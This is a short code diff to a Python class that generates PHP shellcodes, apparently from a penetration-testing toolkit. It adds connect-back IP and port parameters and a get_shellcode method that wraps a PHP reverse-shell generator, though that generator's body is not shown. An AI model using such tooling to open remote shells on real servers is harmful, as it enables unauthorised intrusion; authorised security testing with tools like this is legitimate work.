@@ -1,17 +1,19 @@
-class PhpShellcodes:
+from shellcode import Shellcode
+
+
+class PhpShellcodes(Shellcode):
     """
         Class with shellcodes for php language
     """
 
-    def __init__(self):
+    def __init__(self, connectback_ip='localhost', connectback_port=5555):
+        Shellcode.__init__(self, connectback_ip=connectback_ip, connectback_port=connectback_port)
         self.name = ""
         return
 
     def get_phpinfo(self, badchars):
         """ Function to get phpinfo """
-
         phpcode = "<?php phpinfo(); ?>"
-
         return phpcode
 
     def get_phpcode(self, localhost, localport):
@@ -76,3 +78,9 @@ class PhpShellcodes:
         res = res.replace('\n', '')
         res = res.replace('\r', '')
         return res
+
+    def get_shellcode(self, inline=False):
+        shell = self.get_phpcode(self.CONNECTBACK_IP, self.CONNECTBACK_PORT)
+        if inline:
+            shell = self.make_inline(shell)
+        return shell
